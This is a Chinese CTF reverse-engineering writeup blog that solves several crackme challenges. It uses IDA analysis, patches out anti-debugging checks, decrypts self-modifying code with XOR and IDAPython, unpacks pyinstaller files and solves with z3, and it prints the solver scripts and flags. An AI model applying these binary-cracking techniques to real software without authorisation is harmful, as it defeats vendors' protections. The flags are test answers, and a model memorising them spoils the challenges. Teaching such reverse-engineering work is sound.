Ô3Ä.ì3Ä.+...Ð4Ä. 00C43460 B8 34 C4 00 02 00 00 00 10 34 C4 00 A4 33 C4 00 ¸4Ä......4Ä.¤3Ä. 00C43470 2E 00 00 00 D0 34 C4 00 88 34 C4 00 01 00 00 00 ....Ð4Ä..4Ä..... 00C43480 34 34 C4 00 C8 33 C4 00 02 00 00 00 34 34 C4 00 44Ä.È3Ä.....44Ä. 00C43490 4C 34 C4 00 2D 00 00 00 98 33 C4 00 1C 34 C4 00 L4Ä.-....3Ä..4Ä. 00C434A0 32 00 00 00 40 34 C4 00 D4 33 C4 00 04 00 00 00 2...@4Ä.Ô3Ä..... 00C434B0 94 34 C4 00 34 34 C4 00 2D 00 00 00 E8 34 C4 00 .4Ä.44Ä.-...è4Ä. 00C434C0 70 34 C4 00 30 00 00 00 94 34 C4 00 8C 33 C4 00 p4Ä.0....4Ä..3Ä. 00C434D0 31 00 00 00 64 34 C4 00 40 34 C4 00 2F 00 00 00 1...d4Ä.@4Ä./... 00C434E0 EC 33 C4 00 B0 33 C4 00 33 00 00 00 88 34 C4 00 ì3Ä.°3Ä.3....4Ä. 00C434F0 04 34 C4 00 05 00 00 00 F4 34 C4 00 F4 34 C4 00 .4Ä.....ô4Ä.ô4Ä. 00C43500 02 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 ................ 然后对照着第二部分的代码一点一点看，发现其实就是如果 *(_DWORD *)v7 + v5 == v11 就让 v7 跳到下一个内存地址所指向的地址（这题指针有点绕），比如一开始如果满足输入为 0x34+0x30 接下来就先走到 C43384 ，然后从这里跳到 C43398 这个地址，继续下一步运算，如果 v5 - *(_DWORD *)v7 != v11 就走到下两个内存地址所指向的地址。\n脚本求解 原理就是根据地址跳一次，那么接下来就是求解了，由于每一步都有两种可能（实际上并不是，要在可见字符有范围的）\n一开始觉得可能只有一种路径，直接用循环求解了，结果不行，就写了个dfs\naddr = [ 0x000034, 6, 3, 0x000002, 6, 0xC433E0, 0x00002C, 3, 0xC433D4, 0x00002A, 0xC43458, 0xC43494, 0x000006, 0xC433D4, 0xC433EC, 0x00002A, 6, 0xC43464, 0x00002F, 0xC434B8, 0xC434F4, 0x00002A, 0xC4341C, 0xC43494, 0x000033, 12, 0xC433EC, 0x000003, 0xC433F8, 0xC4341C, 0x000002, 12, 0xC43410, 0x000032, 0xC4347C, 0xC434DC, 0x000032, 0xC43428, 0xC433F8, 0x000032, 3, 0xC434A0, 0x000030, 0, 0xC433EC, 0x000003, 0xC43428, 0xC434A0, 0x000001, 15, 0xC434AC, 0x000032, 0xC433D4, 0xC433EC, 0x00002B, 0xC434D0, 0xC434B8, 0x000002, 0xC43410, 9, 0x00002E, 0xC434D0, 0xC43488, 0x000001, 0xC43434, 0xC433C8, 0x000002, 0xC43434, 0xC4344C, 0x00002D, 6, 0xC4341C, 0x000032, 0xC43440, 0xC433D4, 0x000004, 0xC43494, 0xC43434, 0x00002D, 0xC434E8, 0xC43470, 0x000030, 0xC43494, 3, 0x000031, 0xC43464, 0xC43440, 0x00002F, 0xC433EC, 12, 0x000033, 0xC43488, 0xC43404, 0x000005, 0xC434F4, 0xC434F4, ] for i in range(len(addr)): if addr[i] \u0026gt;= 0xc43380: addr[i] -= 0xc43380 addr[i] //= 4 def dfs(start, add, count): if (add \u0026gt; 0x7e) or add \u0026lt; 0x21: return False if (count \u0026gt;= 21) and (start == 93): print (chr(add), end = \u0026#39;\u0026#39;) return True elif (count \u0026gt;= 21) and start != 93: return False if dfs(addr[start + 1], add + addr[start], count + 1): print (chr(add), end = \u0026#39;\u0026#39;) return True if dfs(addr[start + 2], add - addr[start], count + 1): print (chr(add), end = \u0026#39;\u0026#39;) return True return False dfs(0, 0x30, 5) # 72ab0c6a79cb0b8d0 这个是倒序输出，且有个 0 是最初的 0x30\n最后反转过来就行了\n（因为 adworld 不会提交，也不知道对不对，反正运行结果是 Congratulations!! 了）\n天津垓 反反调试 搜索 ida 字符串可以找到反调试的地方，keypatch 修改跳转或者修改函数返回值即可\n破解 Authorize 运行 exe 文件，看到 Authorize: 字符串，到 ida 中通过 Shift+F12 找到字符串的位置，通过交叉引用找到关键函数。\n查看函数伪代码：\nint sub_1004011F6() { v39 = \u0026#39;H_gnisiR\u0026#39;; v40 = \u0026#39;eppo\u0026#39;; v41 = \u0026#39;!r\u0026#39;; v42 = 0; v31 = \u0026#39;eht nehW\u0026#39;; v32 = \u0026#39;oh evif \u0026#39;; v33 = \u0026#39;sorc snr\u0026#39;; v34 = \u0026#39;g eht ,s\u0026#39;; v35 = \u0026#39;os nedlo\u0026#39;; v36 = \u0026#39;HT reidl\u0026#39;; v37 = \u0026#39;si RESUO\u0026#39;; v38 = \u0026#39;\\n.nrob \u0026#39;; v25 = \u0026#39;t pmuj A\u0026#39;; v26 = \u0026#39;ks eht o\u0026#39;; v27 = \u0026#39; snrut y\u0026#39;; v28 = \u0026#39;dir a ot\u0026#39;; v29 = \u0026#39;.kcik re\u0026#39;; v30 = \u0026#39;\\n\u0026#39;; v21 = \u0026#39;etneserP\u0026#39;; v22 = \u0026#39;IAZ yb d\u0026#39;; v23 = \u0026#39;\\nA\u0026#39;; v24 = 0; strcpy(v20, \u0026#34;%s\u0026#34;); strcpy(Format, \u0026#34;%20s\u0026#34;); v1 = 17; v2 = 8; v3 = 6; v4 = 10; v5 = 15; v6 = 20; v7 = 42; v8 = 59; v9 = 47; v10 = 3; v11 = 47; v12 = 4; v13 = 16; v14 = 72; v15 = 62; v16 = 0; v17 = 7; v18 = 16; scanf(Format, Str); if ( strlen(Str) != 18 ) { printf(v20, \u0026amp;v25); exit(1); } for ( i = 0; i \u0026lt;= 17; ++i ) { v43 = ~(Str[i] \u0026amp; *((_BYTE *)\u0026amp;v39 + i % 14)) \u0026amp; (Str[i] | *((_BYTE *)\u0026amp;v39 + i % 14)); if ( v43 != *(\u0026amp;v1 + i) ) { printf(v20, \u0026amp;v25); exit(1); } } printf(v20, \u0026amp;v31); return printf(v20, \u0026amp;v21); } 找到最后的判断条件 v43 != *(\u0026amp;v1 + i)，而 v43 是通过一个异或来生成的，因此只需要通过 v1 数组和 v39 数组反向求解得到输入的 Str 即可。\n下面是求解代码\nflag = [17, 8, 6, 10, 15, 20, 42, 59, 47, 3, 47, 4, 16, 72, 62, 0, 7, 16] xor = \u0026#39;H_gnisiR\u0026#39;[::-1] + \u0026#39;eppo\u0026#39;[::-1] + \u0026#39;!r\u0026#39;[::-1] for i in range(len(flag)): print (chr(flag[i] ^ ord(xor[i % 14])), end=\u0026#39;\u0026#39;) print () # Caucasus@s_ability patch SMC 将得到的字符串输入程序，发现需要通过第二个认证\nWhen the five horns cross, the golden soldier THOUSER is born. Presented by ZAIA $$$$$$$$$$$$$$ $$$$$$$$$ $$$$$$$ $$$$$$$$$$ $$$$$$$$$$$$$$ $$$$$$$$$$$ $$$$$$$ $$$$$$$$$$$ $$$$$$$$$$$$$$ $$$$$$$$$$$$$ $$$$$$$ $$$$$$$$$$$$$ $$$$$$ $$$$$$ $$$$$$ $$$$$$$ $$$$$$0 $$$$$$ $$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$0 $$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$ $$$$$ $$$ $$$$$$$$$$$$$$$$$$$$ $$$$$$ $$$ $$$$$$ $$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$ $$$$$$ $$0 $$$$$$ $$$$$$$$ Input the flag to hijack the ability of Hiden Intelligence: 在 Strings window 中并没有找到 Input the flag 的字符串，怀疑程序使用了 SMC。\n法一（patch 方法同 HGAME FAKE） SMC 可以手动 patch 或者使用动态调试 dump，这里先选择手动 patch\n在 ida 的汇编页面中浏览 Data 部分，发现在 0x10040164D 位置有一长串未被 ida 解析的二进制数据，推测这部分是被加密过的代码，按 x 交叉引用找到加密的代码\n__int64 sub_100401A6C() { sub_100401506(byte_10040164D, 1045i64, Str); sub_10040162B(); return (*(__int64 (**)(void))byte_10040164D)(); } 发现先用一个函数调用了这段二进制数据，随后调用以这个地址为开头的函数。\n进入 sub_100401506 函数中\nBOOL __fastcall sub_100401506(void *a1, int a2, __int64 a3) { BOOL result; // eax  DWORD flOldProtect; // [rsp+28h] [rbp-8h]  int i; // [rsp+2Ch] [rbp-4h]  void *lpAddress; // [rsp+40h] [rbp+10h]  int v7; // [rsp+48h] [rbp+18h]  __int64 v8; // [rsp+50h] [rbp+20h]  lpAddress = a1; // bytes  v7 = a2; // 1045  v8 = a3; // Str  if ( strlen(Str) != 18 ) exit(1); if ( !VirtualProtect(lpAddress, v7, 0x40u, \u0026amp;flOldProtect) ) exit(1); for ( i = 0; i \u0026lt; v7; ++i ) *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % 18 + v8); // 关键代码  result = VirtualProtect(lpAddress, v7, flOldProtect, \u0026amp;flOldProtect); if ( !result ) exit(1); return result; } 把关键代码美化一下：\nfor ( i = 0; i \u0026lt; v7; ++i ) lpAddress[i] ^= v8[i % 18]; // 关键代码 发现是通过一个异或做的加密，密钥就是第一步中输入的字符串。\n因此写一个python脚本来解密并生成patch文件\nsmc = [0x16, 0x29, 0x0F4, 0x8F, 0x91, 0x72, 0x75, 0x73, 8 , 0x0FE, 0x0F3, 0x45, 0x0E2, 0x69, 0x6C, 0x69, 0x0B3, 0x0FC, 0x0D3, 0x61, 0x75, 0x63, 0x13,0x0D1, 0x6B, 0x73, 0x87, 0x0F6, 0x0CB, 0x61, 0x62, 0x69, 0x0A8, 6 , 0x54, 0x79, 0x84, 0x0E4, 0x0ED, 0x63, 0x61, # 中间部分省略 0x0FC, 0x0A2, 0x89, 0x2B, 0x74, 0x73, 0x40, 0x9B, 0x1C, 0x60, 0x62, 0x69, 0x84, 0x57, 0x75, 0x79, 0x43, 0x90, 0x48, 0x81, 0x0C4, 0x0F0, 1 , 0 , 0 , 0x5D, 0x0C3] file = open(\u0026#39;patch.py\u0026#39;, \u0026#39;w\u0026#39;) str = \u0026#39;Caucasus@s_ability\u0026#39; title = \u0026#39;\u0026#39;\u0026#39;file_path = \u0026#34;天津垓.exe\u0026#34; fr = open(file_path, \u0026#34;rb\u0026#34;) fw = open(\u0026#39;modify_\u0026#39;+file_path, \u0026#34;wb\u0026#34;) data = fr.read() fw.write(data) fw.seek(0xc4d) \u0026#39;\u0026#39;\u0026#39; file.write(title) for i in range(1045): smc[i] ^= (ord(str[i % 18])) for i in range(0, 1045, 50): file.write(\u0026#39;fw.write(\u0026#39;) file.write(f\u0026#39;{bytes(smc[i:i + 50])}\u0026#39;) file.write(\u0026#39;)\\n\u0026#39;) file.close() 在命令行中依次运行 python solve.py 和 python patch.py\n会得到一个新的 exe 文件 modify_天津垓.exe\n在 ida 中打开，进入之前解密的地址，发现此时已经可以被解析了\n法二（ idapython 自动 patch） 自己手动 patch 的好处在于可以避免直接对文件进行操作，如果出现错误不容易复原（毕竟 ida 7.0 没有撤销）。而利用 idapython 的接口进行 patch 则写起来更加方便。\ndef patch(start, end): str = \u0026#39;Caucasus@s_ability\u0026#39; addr = start while(addr \u0026lt; end + 1): PatchByte(addr, Byte(addr) ^ ord(str[(addr - start) % 18])) addr += 1 print (addr - start) 如果将 str 取出作为变量的一部分，这段代码就可以通用到一些其他题目了。\n随后在 ida 的 File \u0026gt; script file 中选择写好的脚本，在 File \u0026gt; script command 中直接输入 patch( \u0026lt;start_addr\u0026gt;, \u0026lt;end_addr\u0026gt;) 即可（具体的 \u0026lt;addr\u0026gt; 可以直接从 ida 的汇编页面中读取）\n点击 run 后即可 patch 成功。\nhijack 查看上一步中成功解密的代码\nint sub_10040164D() { v9 = 2007666; v10 = 2125764; v11 = 1909251; v12 = 2027349; v13 = 2421009; v14 = 1653372; v15 = 2047032; v16 = 2184813; v17 = 2302911; v18 = 2263545; v19 = 1909251; v20 = 2165130; v21 = 1968300; v22 = 2243862; v23 = 2066715; v24 = 2322594; v25 = 1987983; v26 = 2243862; v27 = 1869885; v28 = 2066715; v29 = 2263545; v30 = 1869885; v31 = 964467; v32 = 944784; v33 = 944784; v34 = 944784; v35 = 728271; v36 = 1869885; v37 = 2263545; v38 = 2283228; v39 = 2243862; v40 = 2184813; v41 = 2165130; v42 = 2027349; v43 = 1987983; v44 = 2243862; v45 = 1869885; v46 = 2283228; v47 = 2047032; v48 = 1909251; v49 = 2165130; v50 = 1869885; v51 = 2401326; v52 = 1987983; v53 = 2243862; v54 = 2184813; v55 = 885735; v56 = 2184813; v57 = 2165130; v58 = 1987983; v59 = 2460375; strcpy(Format, \u0026#34;Input the flag to hijack the ability of Hiden Intelligence:\u0026#34;); strcpy(v7, \u0026#34;Progrise Key confirmed. Ready to break.\\n\u0026#34;); strcpy(v6, \u0026#34;Jacking Break! Zaia Enterprise.\u0026#34;); strcpy(v5, \u0026#34;%59s\u0026#34;); v3 = 29477; v4 = 0; strcpy(v2, \u0026#34;Not verified!\u0026#34;); v62 = 2147483659; printf(Format); scanf(v5, Str); printf(v7); if ( strlen(Str) != 51 ) { printf(v2); exit(0); } v61 = 19683; for ( i = 0; i \u0026lt;= 0x32; ++i ) { v60 = v61 * (unsigned int)(unsigned __int8)Str[i] % v62; // 关键代码  if ( v60 != *(\u0026amp;v9 + i) ) // 验证  { printf(v2); exit(0); } } printf(v6); getchar(); return getchar(); } 将关键代码美化一下\nif ( *(\u0026amp;v9 + i) != v61 * Str[i] % v62 ) 只要确保式子两端一直相等就行\n程序的输入部分还是存到了 Str 中，因此只需要通过已经定义好的数求出 Str 就可以\n这里直接对 Str 的每一位进行枚举（也可以用 z3 solver 或者求模逆等方法求解）\n#include \u0026lt;stdio.h\u0026gt; int v[51]; int main(){ v[ 0] = 2007666; v[ 1] = 2125764; // 中间省略  v[49] = 1987983; v[50] = 2460375; int v61 = 19683; int res = 0; for(int i = 0; i \u0026lt;= 0x32; ++i){ for(res = 0; res \u0026lt;= 0x80; res++){ if (v[i] == v61 * res % 2147483659){ printf(\u0026#34;%c\u0026#34;, res); break; } } } printf(\u0026#34;\\n\u0026#34;); return 0; } // flag{Thousandriver_is_1000%_stronger_than_zero-one} 在程序中输入这个字符串后，就能看到如下输出\nInput the flag to hijack the ability of Hiden Intelligence:flag{Thousandriver_is_1000%_stronger_than_zero-one} Progrise Key confirmed. Ready to break. Jacking Break! Zaia Enterprise. 说明我们破解成功了！\nfxck! 在输出前经过了两个函数，猜测第一个是加密，第二个是验证\n看一下第一个函数，里面大概有两段代码是有用的\n第一段\nfor ( i = 0; i \u0026lt; v10; ++i ) { v14 = input_v11[i]; for ( j = 0; j \u0026lt; v12; ++j ) { v14 += (unsigned __int8)v20[j] \u0026lt;\u0026lt; 8; v20[j] = v14 % 58; v14 /= 58u; } while ( v14 ) { v4 = v12++; v20[v4] = v14 % 58; v14 /= 58u; } } 第二段\nfor ( k = 0; k \u0026lt;= 57; ++k ) byte_602500[k] ^= byte_602490[k % 7] ^ (unsigned __int8)k; for ( l = 0; l \u0026lt; v12; ++l ) des_v9[v16 + l] = byte_602500[(unsigned __int8)v20[v12 - 1 - l]];// 转成base58  des_v9[v12 + v16] = 0; 一看到一堆58的取模和除法，猜测是base58编码\n然后动调拿一下table\n接下来看第二个函数，发现输入竟然最后比较的时候才出现，整个函数都是用来生成正确密文的，于是直接动调拿密文\n写个脚本求解就行了\nkey = [0x14, 0x98, 0xE6, 0x55, 0xC8, 0xBF, 0xAA] init = [ 0x55, 0xDB, 0xA7, 0x12, 0x89, 0xFC, 0xEB, 0x5B, 0xDA, 0xA4, 0x13, 0x8E, 0xFD, 0xF7, 0x4B, 0xC5, 0xA5, 0x10, 0x8F, 0xFA, 0xE9, 0x59, 0xD7, 0xAB, 0x7C, 0xE3, 0x96, 0x85, 0x3D, 0xB3, 0xCF, 0x72, 0xD1, 0xFF, 0xEA, 0x54, 0xD8, 0xA6, 0x15, 0x88, 0xFF, 0xEA, 0x54, 0xD8, 0xA7, 0x16, 0x89, 0xE0, 0xEB, 0x57, 0xD9, 0xA1, 0x14, 0x8B, 0xFE, 0xE5, 0x55, 0xDB ] true_table = \u0026#39;\u0026#39; for i in range(len(init)): init[i] ^= key[i % 7] ^ i true_table += \u0026#39;%c\u0026#39; % init[i] from base58 import * flag = \u0026#39;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe\u0026#39; fake_table = \u0026#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#39; true_flag = \u0026#39;\u0026#39; for i in range(len(flag)): true_flag += fake_table[true_table.index(flag[i])] print (b58decode(true_flag)) # b\u0026#39;\\x06flag{63510cf7-2b80-45e1-a186-21234897e5cd}\u0026#39; 得到flag\n 拿到flag之后用程序验证，结果发现没有通过，以为自己只在第一层，base58分析错了，于是从头认真读代码 最后上网看了wp，才发现flag就是过不了验证\n easyparser 见过的最大的VM了，边动调边读指令\n先是一堆初始化，直接动调过去，找输入\n发现用了个循环，先将输入放到一个地址里\n判断最后一个是否为 }\n然后，将输入的一部分取出，存到了某个地址+0xE1到+0x100，正好32位\n然后判断一下头是不是 flag{\n接下来又进入一个循环，发现将某个地址的数字取出，存到了7号寄存器中，然后将对应位的输入取出，存到6号寄存器中\n对6号寄存器分别进行了 ^0x63 和 \u0026lt;\u0026lt;2 两个指令\n然后和7号寄存器进行比较\n猜测对所有明文都进行了同样的加密，所以直接从地址中取出密文，解密\ncipher = [144,332,28,240,132,60,24,64,64,240,208,88,44,8,52,240,276,240,128,44,40,52,8,240,144,68,48,80,92,44,264,240] for c in cipher: print (chr((c \u0026gt;\u0026gt; 2) ^ 0x63), end = \u0026#39;\u0026#39;) print () # G0d_Bless_Wuhan_\u0026amp;_China_Growth!_ ","date":"2021-03-31T20:33:02Z","permalink":"/post/gxzy-re-writeups/","title":"高校战役 re writeups"},{"content":"notsudoku V\u0026amp;NCTF直接白给了，全程耗在了Crackme2上，辛辛苦苦找到密文和算法后发现需要动态调试？过程中not sudoku这题就扫了一眼，结果还没发现是python逆向，于是就爬爬了。\n正文 好像是第一次做python exe的逆向\n首先使用 exeinfo 差壳，发现有个 UPX\n用 upx.exe -d 脱壳\n比赛的时候没想到这个是python逆向，直接拖到ida里面了，于是直接gg\n再使用 exeinfo 查一下，会发现是 pyinstaller 编译的文件，说明是python逆向\n上网下载一下 pyinstxtractor.py 进行反编译\n$ python3 pyinstxtractor.py notsudoku-noupx.exe 进入文件夹，找没有后缀的文件，发现有一个叫做 2 的，使用 010editor 从 struct 文件复制文件头（第一行），然后添加 .pyc 后缀，进行 pyc 反编译\n$ uncompyle6 -o 2.py 2.pyc 即可得到 python 源码文件\n发现文件里有一些日文，于是边阅读边修改就行\n# uncompyle6 version 3.7.4 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.6.9 (default, Jan 26 2021, 15:33:00)  # [GCC 8.4.0] # Embedded file name: 2.py # Compiled at: 1995-09-28 00:18:56 # Size of source mod 2**32: 272 bytes import time, sys, hashlib class class_a: def __init__(self): self.dic = {} self.list_a = [] self.inputflag = \u0026#39;\u0026#39; self.list_b = [] self.int = 65 def え(self, other): def の(f): self.dic[other] = f return f return の def お(self, other): return self.dic.get(other) def run(self): i = 0 while True: invoke = self.list_a[i][0] value = self.list_a[i][1] value_2 = self.list_a[i][2] func = self.お(invoke) func(value, value_2) i += 1 object_a = class_a() @object_a.え(\u0026#39;add\u0026#39;) def f(a, b): if a == 1: object_a.list_b += b @object_a.え(\u0026#39;string\u0026#39;) def f(a, b): if a == 1: print(object_a.inputflag) else: if a == 2: print(object_a.list_b) else: if a == 3: print((object_a.flag), end=\u0026#39;\u0026#39;) else: print(a, end=\u0026#39;\u0026#39;) @object_a.え(\u0026#39;exit\u0026#39;) def f(a, b): sys.exit() @object_a.え(\u0026#39;input\u0026#39;) def f(a, b): object_a.inputflag = input() @object_a.え(\u0026#39;sleep\u0026#39;) def f(a, b): time.sleep(a) @object_a.え(\u0026#39;crypt\u0026#39;) def f(a, b): if len(object_a.inputflag) % 2 != 0: sys.exit() for i in object_a.inputflag: if ord(i) \u0026gt; 52 or ord(i) \u0026lt; 48: # input \u0026gt; \u0026#39;0\u0026#39;, input \u0026lt; \u0026#39;4\u0026#39; sys.exit() x = str(hashlib.new(\u0026#39;md5\u0026#39;, bytes((object_a.inputflag), encoding=\u0026#39;utf8\u0026#39;)).hexdigest()) if x[:6] != \u0026#39;e3a912\u0026#39;: # md5 start with \u0026#39;e3a912\u0026#39; sys.exit() object_a.flag = x @object_a.え(\u0026#39;initlist\u0026#39;) def f(a, b): j = 0 for i in range(0, len(object_a.inputflag), 2): j += 1 a = int(object_a.inputflag[i]) b = int(object_a.inputflag[(i + 1)]) object_a.list_b[a][b] = j # 为list_b赋值 @object_a.え(\u0026#39;basiccheck\u0026#39;) def f(a, b): if object_a.list_b[0][1] != 24 or object_a.list_b[4][3] != 2: sys.exit() if object_a.list_b[0][2] != 1 or object_a.list_b[2][3] != 20: sys.exit() if object_a.list_b[1][0] != 23 or object_a.list_b[3][4] != 3: sys.exit() # 024334xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx23xxxx1001xx @object_a.え(\u0026#39;check\u0026#39;) def f(a, b): int = 0 if b == -1: for i in range(5): int += object_a.list_b[a][i] if int != object_a.int: sys.exit() else: for i in range(5): int += object_a.list_b[i][b] if int != object_a.int: sys.exit() # list_b 每行每列和为65 # 02433420112112034430403122130414004132233324100142 object_a.list_a = [ [ \u0026#39;string\u0026#39;, \u0026#39;welcome baby~ \u0026#39;, 0], [ \u0026#39;string\u0026#39;, \u0026#39;input your flag~:\u0026#39;, 0], [ \u0026#39;input\u0026#39;, 0, 0], [ \u0026#39;string\u0026#39;, \u0026#39;your input is:\u0026#39;, 0], [ \u0026#39;string\u0026#39;, 1, 0], [ \u0026#39;string\u0026#39;, \u0026#34;let\u0026#39;s check......\u0026#34;, 0], [ \u0026#39;sleep\u0026#39;, 0.5, 0], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], # list_b 包含5个五元list [ \u0026#39;crypt\u0026#39;, 0, 0], [ \u0026#39;initlist\u0026#39;, 0, 0], [ \u0026#39;basiccheck\u0026#39;, 0, 0], [ \u0026#39;check\u0026#39;, 0, -1], [ \u0026#39;check\u0026#39;, 1, -1], [ \u0026#39;check\u0026#39;, 2, -1], [ \u0026#39;check\u0026#39;, 3, -1], [ \u0026#39;check\u0026#39;, 4, -1], [ \u0026#39;check\u0026#39;, 0, 0], [ \u0026#39;check\u0026#39;, 0, 1], [ \u0026#39;check\u0026#39;, 0, 2], [ \u0026#39;check\u0026#39;, 0, 3], [ \u0026#39;check\u0026#39;, 0, 4], [ \u0026#39;string\u0026#39;, \u0026#39;Goodjob!\u0026#39;, 0], [ \u0026#39;string\u0026#39;, \u0026#39;The flag is vnctf{\u0026#39;, 0], [ \u0026#39;string\u0026#39;, 3, 0], [ \u0026#39;string\u0026#39;, \u0026#39;}\u0026#39;, 0], [ \u0026#39;exit\u0026#39;, 0, 0]] object_a.run() 不太懂python的注解，这里好像是通过给定的字符串调用相应的函数？\n整体就是一个五阶幻方，最后使用hashlib里的md5算一下\n\u0026gt;\u0026gt;\u0026gt; import hashlib \u0026gt;\u0026gt;\u0026gt; hashlib.new(\u0026#39;md5\u0026#39;, bytes((\u0026#39;02433420112112034430403122130414004132233324100142\u0026#39;), encoding=\u0026#39;utf8\u0026#39;)).hexdigest() \u0026#39;e3a912c1e911ad82544af0c3d753f44f\u0026#39; 套上 vnctf{} 即可\nFilpGame 官方WP写的好玄学，其实用z3也可以解的\n逆向分析 拖入ida，通过字符串定位到关键代码。\nsub_401020(\u0026#34;Input: \u0026#34;); sub_401050(\u0026#34;%s\u0026#34;, inputstring, 512); v0 = 0; v13 = 0; if ( inputstring[0] ) { v1 = dword_403398; v2 = dword_40339C; v14 = dword_403398; while ( v0 \u0026lt; 214 ) { v3 = v0; v4 = \u0026amp;inputstring[v0]; v5 = v3 \u0026amp; 1; if ( v5 ) // 第奇数位  { v6 = *v4; if ( (unsigned __int8)(*v4 - \u0026#39;0\u0026#39;) \u0026gt; 9u ) { if ( (unsigned __int8)(v6 - \u0026#39;A\u0026#39;) \u0026gt; 0x19u )// 大于大写字母时  { v2 = -1; dword_40339C = -1; } else // 大写字母时  { v2 = v6 - \u0026#39;7\u0026#39;; dword_40339C = v6 - \u0026#39;7\u0026#39;; } } else // 为数字时  { v2 = v6 - \u0026#39;0\u0026#39;; dword_40339C = v6 - \u0026#39;0\u0026#39;; } } else // 偶数位  { v7 = *v4; if ( (unsigned __int8)(*v4 - \u0026#39;0\u0026#39;) \u0026gt; 9u ) { if ( (unsigned __int8)(v7 - \u0026#39;A\u0026#39;) \u0026gt; 0x19u ) { dword_403398 = -1; break; } v1 = v7 - \u0026#39;7\u0026#39;; } else { v1 = v7 - \u0026#39;0\u0026#39;; } dword_403398 = v1; v14 = v1; } if ( v1 \u0026gt; 0xF || v2 \u0026gt; 0xF ) // 不能大于F  break; if ( v5 ) // 奇数时，两位两位进行计算  { if ( dword_403018 \u0026gt;= (signed int)(v1 + 16 * v2) )// 0FFFFFFFF  break; dword_403018 = v1 + 16 * v2; // v1为列，v2为行  v8 = 0; do { v9 = v1 + dword_40212C[v8]; // -1 0 0 0 1 先输入的数  v10 = v2 + dword_402140[v8]; // 0 0 -1 1 0 后输入的数  if ( v9 \u0026lt;= 0xF \u0026amp;\u0026amp; v10 \u0026lt;= 0xF ) final_check[v10] ^= 1 \u0026lt;\u0026lt; (15 - v9); // 将所选位置及周围一圈的数字都进行取反，位置用大写十六进制表示  v1 = v14; ++v8; } while ( v8 \u0026lt; 5 ); } v0 = v13 + 1; v13 = v0; if ( !inputstring[v0] ) goto LABEL_25; } } else { LABEL_25: v11 = final_check; // 目标：均为-1  while ( *v11 == -1 ) { ++v11; if ( (signed int)v11 \u0026gt;= (signed int)\u0026amp;unk_40303C ) { sub_401020(\u0026#34;right, vnctf{MD5(%s)}\\n\u0026#34;); return 0; } } } sub_401020(\u0026#34;wrong\\n\u0026#34;); return 0; 脚本求解 简单的说就是已知一个 $16\\times 16$ 的 $01$ 方阵，每次对一个格子取反，都会对相邻的四个格子同样进行取反，最终求解一个操作顺序使得所有的数字为 $1$。\n一开始写了个回溯，然后直接炸了。\n经过队友的提醒开始用z3求解（队友的z3还是从我这里学的。。。），但没想到踩到了好多坑，也学会了一些z3的新用法。\n直接上最后的代码。\nfrom z3 import * init_check = [ [1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0], [1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1], [0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0], [1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0], [1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1], [1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0], [0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0], [0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0], [0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0], [0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0], [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1], [0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1], [0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0] ] posx = [0, -1, 0, 1, 0] posy = [0, 0, -1, 0, 1] solver = Solver() change = [ [BitVec(\u0026#39;change%x%x\u0026#39; % (i, j), 2) for j in range(16)] for i in range(16) ] for i in range(16): for j in range(16): for k in range(5): if i + posx[k] \u0026gt;= 0 and i + posx[k] \u0026lt; 16 and j + posy[k] \u0026gt;= 0 and j + posy[k] \u0026lt; 16: init_check[i][j] ^= (change[i + posx[k]][j + posy[k]]) for i in range(16): for j in range(16): solver.add(change[i][j] \u0026amp; 2 == 0) for i in range(16): for j in range(16): solver.add(init_check[i][j] == 1) while solver.check() == sat: length = 0 model = solver.model() for i in range(16): for j in range(16): if model[change[i][j]] == 1: length += 2 if length \u0026lt; 220: for i in range(16): for j in range(16): if model[change[i][j]] == 1: print (\u0026#39;%X%X\u0026#39; % (j, i), end = \u0026#39;\u0026#39;) print () condition = [] for i in range(16): for j in range(16): condition.append(change[i][j] != int(\u0026#34;%s\u0026#34; % (model[change[i][j]]))) solver.add(Or(condition)) print (\u0026#39;\\nfinish\u0026#39;) 运行结果\n$ FilpGame python3 solve.py 